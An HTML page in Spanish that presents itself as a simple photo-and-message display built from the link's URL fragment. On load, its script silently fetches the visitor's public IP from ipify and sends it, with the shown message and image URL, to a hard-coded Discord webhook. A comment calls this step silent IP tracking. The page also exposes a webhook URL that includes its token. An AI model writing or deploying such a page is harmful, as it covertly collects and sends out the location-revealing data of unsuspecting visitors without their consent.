<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA LAWEITA</title>
    <style>
        body { margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Consolas', monospace; }
        img { max-width: 85%; max-height: 65vh; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        #mensaje { margin-top: 20px; font-size: 2rem; font-weight: bold; text-align: center; }
    </style>
</head>
<body id="cuerpo">
    <img id="foto" src="" alt="">
    <div id="mensaje"></div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1471966301277651129/MF0mPwHqymx_KquApDWqgsChN32QM8eTO6iP2jrz_hhJTdV20-u8MIZELCZVaIWTIqdM"; // <--- PEGA TU WEBHOOK DE DISCORD AQU√ç

        const hash = decodeURIComponent(window.location.hash.substring(1));
        const partes = hash.split('*');

        if (partes.length >= 4) {
            const [urlFoto, texto, bg, txt] = partes;

            document.getElementById('foto').src = urlFoto;
            document.getElementById('mensaje').innerText = texto;
            document.getElementById('cuerpo').style.backgroundColor = "#" + bg;
            document.getElementById('mensaje').style.color = "#" + txt;

            // RASTREO SILENCIOSO DE IP
            fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "üö© ¬°NUEVA CONEXI√ìN DETECTADA!",
                            color: 16711680, // Rojo
                            fields: [
                                { name: "üåê Direcci√≥n IP:", value: `**${ip}**`, inline: true },
                                { name: "üí¨ Mensaje visto:", value: texto, inline: true },
                                { name: "üñºÔ∏è Foto:", value: urlFoto }
                            ],
                            footer: { text: "Rastreador Autom√°tico ipify" },
                            timestamp: new Date()
                        }]
                    })
                });
            });
        }
    </script>
</body>
</html>
